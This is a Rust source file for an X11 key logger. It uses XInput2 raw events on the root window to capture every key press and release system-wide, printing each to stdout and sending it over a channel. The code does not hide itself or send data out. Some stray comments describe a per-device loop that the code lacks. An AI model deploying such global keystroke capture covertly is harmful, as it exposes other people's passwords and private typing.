// src/x11_logger.rs

use std::error::Error;
use std::ffi::CStr;
use std::io::Write;
use std::thread;
use std::time::{Duration, SystemTime};
use std::sync::Mutex;
use std::ptr;
use std::sync::mpsc::Sender;

use crate::events::KeyEvent;

use x11::xlib::*;
use x11::xinput2::*;

static LAST_X_ERROR: Mutex<Option<String>> = Mutex::new(None);

extern "C" fn x_error_handler(_display: *mut Display, err: *mut XErrorEvent) -> i32 {
    unsafe {
        let mut buf = [0i8; 1024];
        XGetErrorText((*err).display, (*err).error_code as i32, buf.as_mut_ptr(), buf.len() as i32);
        let msg = CStr::from_ptr(buf.as_ptr()).to_string_lossy().into_owned();
        let detail = format!(
            "XError code={} ({}) request_code={} minor_code={}",
            (*err).error_code, msg, (*err).request_code, (*err).minor_code
        );
        let mut guard = LAST_X_ERROR.lock().unwrap();
        *guard = Some(detail);
    }
    0
}

/// Runs a simple X11 key logger that globally captures keyboard events.
/// Logs each key press/release to stdout.
#[allow(non_upper_case_globals, unreachable_patterns, unused_variables, non_snake_case)]
pub fn run(tx: Sender<KeyEvent>) -> Result<(), Box<dyn Error>> {
    unsafe {
        // Open the X display (NULL means use $DISPLAY)
        let display = XOpenDisplay(ptr::null());
        // Register X error handler for detailed X11 errors
        XSetErrorHandler(Some(x_error_handler));
        if display.is_null() {
            return Err("Unable to open X display".into());
        }

        let root = XDefaultRootWindow(display);

        // --- XInput2 setup -------------------------------------------------
        // Find the XInput extension opcode (required for GenericEvent handling)
        let mut xi_opcode: i32 = 0;
        let mut event: i32 = 0;
        let mut error: i32 = 0;
        if XQueryExtension(
            display,
            b"XInputExtension\0".as_ptr() as *const i8,
            &mut xi_opcode,
            &mut event,
            &mut error,
        ) == 0
        {
            XCloseDisplay(display);
            return Err("XInput extension not available".into());
        }
        println!("XInput extension found (opcode: {})", xi_opcode);

        // Define the event mask structure
        let mut mask: XIEventMask = std::mem::zeroed();
        
        // XI_LASTEVENT is usually 26 or similar, so mask_len of (XI_LASTEVENT + 7)/8 is what C would do.
        // We will just use 4 bytes since XI_RawKeyRelease is 14, 14/8 = 1.
        let mask_bytes_len = 4;
        let mut mask_bytes = vec![0u8; mask_bytes_len];
        XISetMask(&mut mask_bytes[..], XI_RawKeyPress);
        XISetMask(&mut mask_bytes[..], XI_RawKeyRelease);
        
        mask.deviceid = XIAllMasterDevices;
        mask.mask_len = mask_bytes_len as i32;
        mask.mask = mask_bytes.as_mut_ptr();

        let rc = XISelectEvents(display, root, &mut mask, 1);
        XSync(display, False);
        if rc != 0 {
            if let Some(err) = LAST_X_ERROR.lock().unwrap().as_ref() {
                eprintln!("Failed to select XI2 events on root window: {}", err);
            }
            XCloseDisplay(display);
            return Err("XISelectEvents failed".into());
        }
        println!("XISelectEvents succeeded on XIAllMasterDevices");


                // Select the desired events – now handled per device above, nothing to do here
        // (the loop already performed XISelectEvents for each slave keyboard)
        // No further action needed.
        

        
        // Flush commands
        XSync(display, False);

        // Keep mask_bytes alive for the duration of the program
        std::mem::forget(mask_bytes);
        XFlush(display);

        // -------------------------------------------------------------------
        let mut event: XEvent = std::mem::zeroed();
        loop {
            XNextEvent(display, &mut event);
            if event.type_ == GenericEvent {
                let mut cookie: XGenericEventCookie = event.generic_event_cookie;
                if XGetEventData(display, &mut cookie) != 0 {
                    match cookie.evtype as i32 {
                        ev if ev == XI_RawKeyPress => {
                            let raw = cookie.data as *mut XIRawEvent;
                            let keycode = (*raw).detail as u32;
                            let keysym = XKeycodeToKeysym(display, keycode as u8, 0);
                            let name = if keysym == 0 {
                                "Unknown".to_string()
                            } else {
                                let c_str = XKeysymToString(keysym);
                                CStr::from_ptr(c_str).to_string_lossy().into_owned()
                            };
                            
                            let _ = tx.send(KeyEvent {
                                event_type: "PRESS",
                                key_name: name.clone(),
                                keycode,
                                timestamp: SystemTime::now(),
                            });

                            println!("Key pressed: {} (xcode={})", name, keycode);
                            std::io::stdout().flush().unwrap();
                        }
                        ev if ev == XI_RawKeyRelease => {
                            let raw = cookie.data as *mut XIRawEvent;
                            let keycode = (*raw).detail as u32;
                            let keysym = XKeycodeToKeysym(display, keycode as u8, 0);
                            let name = if keysym == 0 {
                                "Unknown".to_string()
                            } else {
                                let c_str = XKeysymToString(keysym);
                                CStr::from_ptr(c_str).to_string_lossy().into_owned()
                            };

                            let _ = tx.send(KeyEvent {
                                event_type: "RELEASE",
                                key_name: name.clone(),
                                keycode,
                                timestamp: SystemTime::now(),
                            });

                            println!("Key released: {} (xcode={})", name, keycode);
                            std::io::stdout().flush().unwrap();
                        }
                        _ => {}
                    }
                    XFreeEventData(display, &mut cookie);
                }
            }
            thread::sleep(Duration::from_millis(10));
        }
    }
}

// End of x11_logger.rs
